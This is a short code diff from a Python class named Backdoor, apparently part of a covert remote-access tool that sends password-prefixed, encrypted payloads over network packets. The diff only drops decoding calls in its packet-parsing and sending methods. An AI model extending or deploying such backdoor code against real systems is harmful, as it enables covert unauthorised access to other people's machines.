@@ -35,7 +35,7 @@ class Backdoor(object):
 
     def parsePacket(self, packet):
         payload = packet[self.protocol].payload.load
-        payload = helpers.decode(encryption.decrypt(payload))
+        payload = encryption.decrypt(payload)
 
         if payload == "":
             return
@@ -74,8 +74,6 @@ class Backdoor(object):
         time.sleep(0.1)
 
     def sendPacket(self, data):
-        data = helpers.decode(data)
-
         payload = encryption.encrypt(self.password + data)
         #chunks = [payload[start:start + chunk_size] for start in range(0, len(payload), chunk_size)]
         if self.protocol == 'TCP':
